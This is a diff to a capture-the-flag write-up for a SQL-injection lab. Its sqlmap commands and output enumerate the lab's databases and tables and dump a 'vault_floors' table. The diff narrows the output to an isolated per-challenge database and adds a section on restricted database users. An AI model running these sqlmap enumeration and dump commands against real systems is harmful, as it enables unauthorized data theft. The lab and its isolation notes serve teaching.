@@ -167,46 +167,42 @@ sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
 ```
 available databases [2]:
 [*] information_schema
-[*] seiyaku
+[*] seiyaku_p2_floors
 ```
 
-### Step 4, enumerate tables in `seiyaku`
+Only this floor's own database shows up. Every challenge in this lab runs
+in its own database and connects as its own restricted user, so the
+account this injection runs through cannot see any other floor's
+database, let alone its tables or flags (see the Isolation note at the
+end). There is no shared `seiyaku` schema to wander into.
+
+### Step 4, enumerate tables in `seiyaku_p2_floors`
 
 ```
-sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku --tables
+sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_floors --tables
 ```
 
 ```
-Database: seiyaku
-[10 tables]
+Database: seiyaku_p2_floors
+[2 tables]
 +--------------+
-| applicants   |
-| door         |
 | floors       |
-| keeper       |
-| patients     |
-| records      |
-| results      |
-| staff        |
-| vault        |
 | vault_floors |
 +--------------+
 ```
 
-Nine of these ten back other floors across the whole exam (`applicants`,
-`door`, `keeper`, `patients`, `records`, `results`, `staff`, `vault`,
-Phase 1's tables), `floors` and `vault_floors` are this floor's own.
-`vault_floors` stands out as the one name this route's own display page
-never mentions anywhere.
+Just this floor's own two tables. `floors` is the catalog the display
+page shows; `vault_floors` is the one name this route's own page never
+mentions anywhere, which makes it the obvious thing to look inside.
 
 ### Step 5, enumerate columns of `vault_floors`
 
 ```
-sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T vault_floors --columns
+sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_floors -T vault_floors --columns
 ```
 
 ```
-Database: seiyaku
+Database: seiyaku_p2_floors
 Table: vault_floors
 [3 columns]
 +------------+--------------+
@@ -221,11 +217,11 @@ Table: vault_floors
 ### Step 6, dump it
 
 ```
-sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku -T vault_floors --dump
+sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_floors -T vault_floors --dump
 ```
 
 ```
-Database: seiyaku
+Database: seiyaku_p2_floors
 Table: vault_floors
 [1 entry]
 +----+----------------------------------+------------------+
@@ -246,9 +242,9 @@ sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T vault_floors
 ```
 [13:28:05] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
 [13:28:05] [INFO] fetching current database
-[13:28:05] [INFO] fetching columns for table 'vault_floors' in database 'seiyaku'
-[13:28:05] [INFO] fetching entries for table 'vault_floors' in database 'seiyaku'
-Database: seiyaku
+[13:28:05] [INFO] fetching columns for table 'vault_floors' in database 'seiyaku_p2_floors'
+[13:28:05] [INFO] fetching entries for table 'vault_floors' in database 'seiyaku_p2_floors'
+Database: seiyaku_p2_floors
 Table: vault_floors
 [1 entry]
 +----+----------------------------------+------------------+
@@ -374,3 +370,16 @@ account for an applicant who skips the floors instead of climbing them.
   just this one. A scanner as capable as sqlmap being freely available
   to attackers is exactly why "we fixed the one bug we know about" was
   never the finish line.
+
+## Isolation
+
+This floor lives in its own database (`seiyaku_p2_floors`) and connects
+as its own restricted user (`svc_p2_floors`), granted access to nothing
+else. That is why `--dbs` and `--tables` above returned only this floor's
+own database and its two tables: `information_schema` is filtered by the
+connecting user's privileges, so other challenges' tables are invisible,
+not just unreferenced, and cross-database reads or `USE` of another
+challenge's database are denied outright. A solver can be sure the flag
+they dumped is *this* floor's, because the account they injected through
+cannot reach anywhere else. (Every MariaDB-backed challenge in the lab is
+isolated the same way.)
